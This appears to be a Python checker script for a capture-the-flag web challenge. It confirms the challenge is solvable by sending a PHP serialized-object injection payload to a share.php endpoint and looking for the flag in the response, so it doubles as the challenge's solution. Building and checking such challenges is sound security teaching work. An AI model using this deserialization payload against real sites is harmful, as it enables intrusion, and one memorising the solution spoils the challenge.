import requests

from inspectors.web import WebChallengeInspector


class YonezerInspector(WebChallengeInspector):
    def solve(self) -> bool:
        try:
            payload = 'O:6:"secret":0:{}'
            res = requests.get(f'{self.url}/share.php', params={'data': payload})
            assert self.flag in res.text

            self.logger.info(self.msg_succeeded_to_solve())
            return True

        except:
            self.logger.warning(self.msg_failed_to_solve())
            return False
